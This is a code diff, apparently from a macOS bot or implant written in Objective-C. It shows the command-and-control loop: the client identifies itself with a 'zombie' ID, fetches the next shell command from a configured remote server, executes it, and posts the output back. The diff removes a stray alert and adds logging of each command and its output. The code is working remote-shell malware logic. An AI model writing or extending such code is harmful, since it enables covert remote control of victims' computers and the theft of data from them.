@@ -97,8 +97,6 @@
 
 +(NSArray *)nextCommand {
     [WTLogger neutral:@"nextCommand start"];
-    NSAlert *alert = [NSAlert alertWithMessageText:@"Go" defaultButton:@"Go" alternateButton:@"g" otherButton:@"f" informativeTextWithFormat:@"f"];
-    //[alert runModal];
     WTConfig *config = [WTConfig getConfig];
     NSString *zombieId = [config getZombieId];
     NSString *url = [NSString stringWithFormat:@"%@/next/command/%@", [config getBaseUrl], zombieId];
@@ -118,6 +116,7 @@
     WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
     WTConfig *config = [WTConfig getConfig];
     NSString *url = [NSString stringWithFormat:@"%@/finished/command/%@", [config getBaseUrl], commandId];
+    [WTLogger good:[NSString stringWithFormat:@"Sending command output: %@ for command id: %@", output, commandId]];
     [httpObj httpPostRequest:url usingGetData:nil usingPostData:@{@"output":output}];
     [WTLogger neutral:@"sendCommandOutput returning"];
 }
@@ -131,6 +130,7 @@
     }
     NSString *commandId = nextCommandArray[0];
     NSString *command = nextCommandArray[1];
+    [WTLogger good:[NSString stringWithFormat:@"about to execut command: %@", command]];
     NSString *commandOutput = [WTShellCommands runShellCommand:command withMaxBufferSize:-1];
     NSString *url = [NSString stringWithFormat:@"%@/finished/command/%@", [config getBaseUrl], commandId];
     [[[WTHTTPApi alloc] init] httpPostRequest:url usingGetData:nil usingPostData:@{@"output":commandOutput}];
